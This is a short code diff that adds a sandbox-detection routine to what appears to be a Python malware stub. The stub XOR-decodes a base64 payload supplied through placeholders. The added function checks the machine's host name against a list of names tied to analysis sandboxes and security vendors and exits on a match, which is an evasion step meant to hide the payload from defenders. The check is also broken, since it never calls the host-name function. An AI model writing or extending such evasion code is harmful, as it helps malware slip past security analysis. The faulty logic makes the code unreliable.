@@ -1,3 +1,4 @@
+import socket
 import subprocess
 import os
 import base64
@@ -13,6 +14,24 @@ def xor(data, key):
 def generate_string(length):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
+
+def sandbox_check():
+    hostnames = [
+        "HANSPETER-PC",
+        "JOHN-PC",
+        "MUELLER-PC",
+        "WIN7-TRAPS",
+        "SANDBOX",
+        "7SILVIA",
+        "FORTINET",
+        "TEQUILABOOMBOOM"
+    ]
+
+    if socket.gethostname in hostnames:
+        exit()
+
+
+sandbox_check()
 
 XOR_KEY = b'REPLACE_XOR_KEY'
 XOR_B64_PAYLOAD = b'REPLACE_B64_PAYLOAD'
